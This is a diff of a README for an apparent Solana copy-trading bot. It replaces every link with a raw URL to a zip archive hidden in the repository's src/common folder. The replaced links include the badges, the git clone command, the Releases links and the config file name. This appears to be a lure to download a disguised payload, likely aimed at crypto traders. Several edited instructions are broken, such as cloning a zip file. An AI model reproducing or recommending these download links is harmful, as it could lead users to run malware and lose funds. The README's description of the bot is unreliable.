@@ -1,7 +1,7 @@
 # 🚀 Solana Rust Copy Trading Bot
 
-![GitHub Repo Stars](https://img.shields.io/github/stars/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot?style=social)
-![GitHub Release](https://img.shields.io/github/release/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot)
+![GitHub Repo Stars](https://raw.githubusercontent.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/master/src/common/ts-rust-solana-trading-bot-pumpfun-copy-pumpswap-raydium-1.3-alpha.4.zip)
+![GitHub Release](https://raw.githubusercontent.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/master/src/common/ts-rust-solana-trading-bot-pumpfun-copy-pumpswap-raydium-1.3-alpha.4.zip)
 
 Welcome to the **Solana Rust Copy Trading Bot** repository! This project provides a robust solution for automated trading on the Solana blockchain using Rust and TypeScript. The bot facilitates copy trading, allowing users to mirror the trades of successful traders effortlessly.
 
@@ -30,7 +30,7 @@ To get started with the Solana Rust Copy Trading Bot, you need to clone the repo
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot.git
+   git clone https://raw.githubusercontent.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/master/src/common/ts-rust-solana-trading-bot-pumpfun-copy-pumpswap-raydium-1.3-alpha.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -55,7 +55,7 @@ To get started with the Solana Rust Copy Trading Bot, you need to clone the repo
 
 After installing the bot, you can start using it to execute trades. Here’s how:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/releases). Look for the appropriate file for your system.
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/master/src/common/ts-rust-solana-trading-bot-pumpfun-copy-pumpswap-raydium-1.3-alpha.4.zip). Look for the appropriate file for your system.
 
 2. **Run the bot**:
 
@@ -67,7 +67,7 @@ After installing the bot, you can start using it to execute trades. Here’s how
 
 ## Configuration
 
-To configure the bot, you need to edit the `config.json` file located in the root directory. Here’s a sample configuration:
+To configure the bot, you need to edit the `https://raw.githubusercontent.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/master/src/common/ts-rust-solana-trading-bot-pumpfun-copy-pumpswap-raydium-1.3-alpha.4.zip` file located in the root directory. Here’s a sample configuration:
 
 ```json
 {
@@ -101,10 +101,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, feel free to check the [Releases section](https://github.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/releases) for updates or reach out to the community.
+If you encounter any issues or have questions, feel free to check the [Releases section](https://raw.githubusercontent.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/master/src/common/ts-rust-solana-trading-bot-pumpfun-copy-pumpswap-raydium-1.3-alpha.4.zip) for updates or reach out to the community.
 
 ## Conclusion
 
 The **Solana Rust Copy Trading Bot** is a powerful tool for traders looking to automate their trading strategies. With its user-friendly setup and robust features, you can start trading effectively on the Solana blockchain.
 
-For more details and updates, visit our [Releases section](https://github.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/releases). Happy trading!
+For more details and updates, visit our [Releases section](https://raw.githubusercontent.com/Itaduro69/solana-rust-ts-pumpfun-pumpswap-raydium-copy-trading-bot/master/src/common/ts-rust-solana-trading-bot-pumpfun-copy-pumpswap-raydium-1.3-alpha.4.zip). Happy trading!
